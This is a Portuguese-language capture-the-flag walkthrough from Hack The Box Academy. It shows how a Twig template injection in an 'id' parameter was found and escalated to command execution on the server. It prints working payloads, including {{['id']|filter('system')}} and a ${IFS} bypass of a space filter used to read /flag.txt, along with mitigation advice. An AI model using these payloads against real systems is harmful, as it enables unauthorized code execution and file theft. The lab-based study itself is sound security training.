<div align="center">

# 🥷 Server-Side Template Injection (Twig) → Remote Code Execution

![HTB Academy](https://img.shields.io/badge/HTB%20Academy-CPTS/CWES-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Module](https://img.shields.io/badge/Módulo-Introduction%20to%20Server--side%20Attacks-blue?style=for-the-badge)
![Vulnerability](https://img.shields.io/badge/Vulnerabilidade-SSTI%20(Twig)-red?style=for-the-badge)
![Impact](https://img.shields.io/badge/Impacto-RCE-critical?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Concluído-success?style=for-the-badge)

</div>

---

## 📑 Índice

- [Cenário](#-cenário)
- [Enumeração Inicial](#-enumeração-inicial)
- [Interceptando as Requisições](#-interceptando-as-requisições)
- [Hipótese Inicial: SSRF](#-hipótese-inicial-ssrf)
- [Enumeração de Diretórios](#-enumeração-de-diretórios)
- [Reavaliando a Aplicação](#-reavaliando-a-aplicação)
- [Testando SSTI](#-testando-ssti)
- [Fingerprint do Template Engine](#-fingerprint-do-template-engine)
- [Alcançando RCE](#-alcançando-rce)
- [Enumerando o Servidor](#-enumerando-o-servidor)
- [Contornando a Restrição de Espaços](#-contornando-a-restrição-de-espaços)
- [Localizando a Flag](#-localizando-a-flag)
- [Fluxo do Ataque](#-fluxo-do-ataque)
- [Principais Aprendizados](#-principais-aprendizados)
- [Mitigação](#-mitigação)
- [Habilidades Demonstradas](#-habilidades-demonstradas)
- [Disclaimer Ético](#-disclaimer-ético)

---

## 🎯 Cenário

A **Flavor Fusion Express** contratou uma avaliação de segurança para seu site recém-implantado. O objetivo era identificar vulnerabilidades nos componentes server-side da aplicação que pudessem expor informações sensíveis ou permitir acesso não autorizado a funcionalidades internas do backend.

Diferente dos laboratórios anteriores, a aplicação apresentava uma superfície de ataque extremamente reduzida. À primeira vista, o site era composto apenas de conteúdo estático, sem mecanismos de autenticação, formulários ou funcionalidades interativas visíveis.

A avaliação, portanto, se concentrou em analisar a comunicação entre cliente e backend.

## 🔍 Enumeração Inicial

A página inicial da aplicação continha apenas conteúdo informativo:

- Links de navegação não funcionais
- Nenhuma página de login
- Nenhum campo de busca ou formulário
- Nenhum endpoint administrativo óbvio exposto

> <img src="https://i.imgur.com/2RIgnCw.png"/>

## 🕵️ Interceptando as Requisições

Como o front-end oferecia praticamente nenhuma superfície de ataque, o próximo passo foi interceptar o tráfego HTTP da aplicação usando o Burp Suite.

Ao recarregar a página, a seguinte requisição foi revelada:

```http
POST /

api=http://truckapi.htb/?id=FusionExpress03
```
> <img src="https://i.imgur.com/qg7GP9U.png"/>

Isso chamou atenção imediatamente: em vez de consultar recursos locais, a aplicação encaminhava uma URL completa através do parâmetro POST `api`, indicando que o backend buscava informações em outro serviço.

## 🧩 Hipótese Inicial: SSRF

Com base no conhecimento adquirido na seção de SSRF do módulo, a primeira hipótese foi que a aplicação poderia estar vulnerável a **Server-Side Request Forgery**.

O parâmetro continha uma URL inteira:

```
api=http://truckapi.htb/?id=FusionExpress03
```

Esse padrão é comumente associado a vulnerabilidades de SSRF.

## 📂 Enumeração de Diretórios

Assumindo acesso ao serviço interno, foi realizado um brute force de diretórios com **ffuf**:

```bash
ffuf \
  -w raft-small-words.txt \
  -u http://TARGET/ \
  -X POST \
  -d "api=http://truckapi.htb/FUZZ?id=FusionExpress03"
```

Vários endpoints foram descobertos, incluindo recursos PHP e HTML. No entanto, todos os endpoints retornaram:

```
403 Forbidden
```

Nenhuma funcionalidade útil foi alcançada por essa abordagem, e a hipótese de SSRF se tornou consideravelmente mais fraca.

## 🔄 Reavaliando a Aplicação

Em vez de continuar o brute force no serviço interno, a resposta HTTP foi analisada com mais cuidado. A aplicação respondeu com:

```json
{
    "id": "FusionExpress03",
    "location": "134 Main Street"
}
```

A observação importante foi que o valor fornecido através do parâmetro `id` era refletido diretamente na resposta.

Embora não existisse input controlável pelo usuário no site visível, o backend claramente processava esse parâmetro antes de gerar a resposta JSON, um comportamento que sugeria outra vulnerabilidade server-side.

## 🧪 Testando SSTI

O primeiro payload utilizado foi a clássica expressão aritmética:

```
{{7*7}}
```

A requisição ficou:

```
api=http://truckapi.htb/?id={{7*7}}
```

O servidor respondeu com:

```json
{
    "id": "49",
    ...
}
```

> <img src="https://i.imgur.com/23FOYRO.png"/>

Como o template avaliou a expressão em vez de retorná-la literalmente, a existência de uma vulnerabilidade de **Server-Side Template Injection** foi confirmada.

## 🔬 Fingerprint do Template Engine

O próximo objetivo foi identificar qual template engine estava rodando. O seguinte payload foi utilizado:

```
{{7*'7'}}
```

O resultado obtido correspondeu ao comportamento característico do **Twig**, confirmando que a aplicação utilizava esse template engine.

## 💥 Alcançando Remote Code Execution

De acordo com o módulo, o Twig permite a execução de funções PHP através da função `filter()`.

O seguinte payload foi submetido:

```
{{['id']|filter('system')}}
```

Requisição:

```
api=http://truckapi.htb/?id={{['id']|filter('system')}}
```

> <img src="https://i.imgur.com/iYfyW4o.png"/>

O servidor executou o comando Linux `id` e retornou sua saída. Nesse ponto, o **Remote Code Execution (RCE)** foi alcançado com sucesso.

## 🗄️ Enumerando o Servidor

O próximo passo lógico foi listar o sistema de arquivos. O payload óbvio seria:

```
ls /
```

No entanto, isso introduziu um obstáculo inesperado: **espaços não podiam ser inseridos no payload**.

Tentativas usando:

- URL Encoding
- `%20`
- `%09`
- Encoding de nova linha

foram todas rejeitadas pela aplicação.

## 🛡️ Contornando a Restrição de Espaços

Em vez de usar um espaço literal, a variável de shell do Linux `${IFS}` (*Internal Field Separator*) foi utilizada. O `${IFS}` se comporta como um separador de espaço em branco dentro do shell.

Payload:

```
{{['ls${IFS}/']|filter('system')}}
```

Isso contornou completamente a restrição, e o servidor executou com sucesso:

```
ls /
```

> <img src="https://i.imgur.com/05cgdS9.png"/>

## 🚩 Localizando a Flag

A listagem do diretório revelou o arquivo `flag.txt`. O payload final ficou:

```
{{['cat${IFS}/flag.txt']|filter('system')}}
```

A aplicação retornou o conteúdo do arquivo de flag, concluindo com sucesso a avaliação.

<img src="https://i.imgur.com/zR6R5LW.png"/>

## 🔗 Fluxo do Ataque

```
Site estático
      │
      ▼
Interceptação das requisições HTTP
      │
      ▼
Parâmetro POST contendo uma URL
      │
      ▼
Hipótese inicial de SSRF
      │
      ▼
Fuzzing de diretórios
      │
      ▼
Respostas 403
      │
      ▼
Análise do parâmetro refletido
      │
      ▼
Payload SSTI {{7*7}}
      │
      ▼
SSTI confirmado
      │
      ▼
Fingerprint do Twig
      │
      ▼
Execução de comandos do sistema
      │
      ▼
Bypass da restrição de espaços (${IFS})
      │
      ▼
Enumeração do sistema de arquivos
      │
      ▼
Leitura de /flag.txt
```

## 🎓 Principais Aprendizados

> **A primeira vulnerabilidade aparente nem sempre é o vetor de ataque correto.**

Inicialmente, a presença de uma URL controlável pelo usuário sugeria fortemente uma vulnerabilidade de SSRF. No entanto, após os endpoints internos se mostrarem inacessíveis, uma análise mais profunda revelou que a fraqueza real estava no tratamento inseguro do parâmetro `id` pelo backend, renderizado pelo template engine Twig.

Uma vez identificada a vulnerabilidade de SSTI, foi possível escalar o ataque de avaliação de template para **Remote Code Execution**, eventualmente contornando restrições de comando com a variável de shell `${IFS}` e lendo arquivos arbitrários do sistema operacional subjacente.

Esse caso reforça a importância de não descartar hipóteses rapidamente, mas também de não se apegar à primeira teoria quando as evidências apontam para outra direção.

## 🛠️ Mitigação

- Nunca concatenar input do usuário diretamente em templates Twig.
- Passar valores controlados pelo usuário exclusivamente como variáveis de template.
- Desabilitar funcionalidades perigosas do Twig capazes de invocar funções PHP.
- Executar o template engine com privilégios mínimos.
- Validar e sanitizar todo input do usuário.
- Aplicar o Princípio do Menor Privilégio ao processo do servidor web.

## 🧠 Habilidades Demonstradas

- Interceptação e análise de tráfego HTTP com Burp Suite
- Formulação e reavaliação de hipóteses de vulnerabilidade (SSRF vs. SSTI)
- Fuzzing de diretórios com ffuf
- Identificação e exploração de Server-Side Template Injection
- Fingerprinting de template engines (Twig)
- Exploração de SSTI para Remote Code Execution
- Bypass de filtros de restrição de caracteres usando `${IFS}`
- Enumeração de sistema de arquivos pós-exploração

## ⚖️ Disclaimer Ético

Este write-up documenta uma atividade realizada em ambiente controlado e autorizado do **Hack The Box Academy**, com fins exclusivamente educacionais. As técnicas aqui descritas não devem ser aplicadas contra sistemas sem autorização explícita. Testes de intrusão sem consentimento configuram crime.

---
